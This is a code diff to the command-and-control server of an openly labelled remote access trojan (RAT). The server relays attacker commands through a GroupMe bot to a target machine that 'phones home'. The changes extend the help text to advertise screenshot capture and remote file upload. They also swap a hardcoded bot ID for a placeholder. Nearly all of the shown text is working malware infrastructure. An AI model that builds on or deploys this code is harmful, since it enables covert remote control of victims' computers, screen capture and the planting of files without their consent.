@@ -27,6 +27,7 @@ def webhook():
        file=open(filecmd, "r")
 # Loop through here, sending one command at a time getting output back.
        cmd=file.read()
+#       count=0
        data['text']=cmd
        js=json.dumps(data)
        log('Sent {}'.format(data))
@@ -34,10 +35,11 @@ def webhook():
        open('commands.txt', 'w').close()
        resp=Response(js, status=200, mimetype='application/json')
        return resp
+#       exit()
 
 # Display the help page if attacker types 'help'
     if data['text'] == 'help':
-       msg = 'Welcome to RAT interface for GroupME'
+       msg = 'Welcome to RAT interface for GroupME. "pic" for a screenshot."upload URL OUTPUT_FILE_LOCATION" for file uploading.'
        send_message(msg)
 
 # Get command attacker sends. Write these commands to file until they are run. 
@@ -46,6 +48,7 @@ def webhook():
        filename='commands.txt'
        file=open(filename, "a+")
        file.write(cmd + ',')
+#       file.write('\n')
        file.close()
        msg='Executing Command when target phones home next: '
        msg=msg+cmd
@@ -55,7 +58,7 @@ def send_message(msg):
   url  = 'https://api.groupme.com/v3/bots/post'
 
   data = {
-          'bot_id' : "688958bd70cfbf125a71291636",
+          'bot_id' : "YOUR BOT ID",
           'text'   : msg,
          }
   request = Request(url, urlencode(data).encode())
@@ -65,3 +68,4 @@ def send_message(msg):
 def log(msg):
   print(str(msg))
   sys.stdout.flush()
+
